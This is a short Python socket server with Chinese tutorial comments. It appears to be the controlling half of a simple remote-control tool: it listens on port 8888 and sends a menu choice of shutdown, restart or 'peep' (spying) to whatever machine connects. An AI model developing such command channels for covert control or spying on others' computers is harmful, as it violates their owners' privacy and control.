from socket import* #导入网络编程的模块
#1.准备一个电话（套接字）
S = socket()
#2.套接字绑定一个号码
S.bind(('0.0.0.0',8888))
#电话机.绑定 为什么是0.0.0.0？ 默认是直接使用本计算机上的ip地址
#第二个是端口号 1024-65535之间
#3.套接字开启监听
S.listen()
#4.如果有申请连接 主套接字接受 转接给分套接字
s,addr = S.accept()

print(addr)# 直接查看对方的ip 对方来自哪里
print('1.关机 2.重启 3.偷窥')
choice = input('编号:')
s.send(choice.encode())#encode? 将数字转为二进制代码